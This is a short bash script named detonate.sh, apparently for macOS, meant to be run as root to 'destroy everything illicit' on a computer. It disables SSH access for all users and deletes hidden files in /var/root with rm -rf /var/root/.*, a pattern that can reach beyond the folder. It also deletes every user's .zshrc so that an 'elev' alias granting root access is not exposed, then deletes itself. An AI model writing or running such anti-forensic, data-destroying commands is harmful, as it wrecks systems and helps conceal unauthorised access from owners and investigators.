#!/bin/bash

# !!! WARNING !!!
# DO NOT RUN THIS UNLESS YOU KNOW WHAT YOU ARE DOING.
# THIS SCRIPT WILL DESTROY EVERYTHING ILLICIT ON YOUR COMPUTER,
# BUT IT WILL ALSO MAKE IT UNUSABLE AND REQUIRE A REIMAGE.
# TREAD VERY CAREFULLY.

# This should be run from the /var/root directory and must be run as an administrator.


# Turn of SSH for all users, which could raise some red flags.
dscl . change /Groups/com.apple.access_ssh-disabled RecordName com.apple.access_ssh-disabled com.apple.access_ssh

# Remove files in root directory which shouldn't be there.
rm -rf /var/root/.*

# Remove .zshrcs so as to not expose the "elev" alias and give away root access means.
rm /Users/*/.zshrc

# All done - if system is somehow still running, remove this script
rm /var/root/detonate.sh
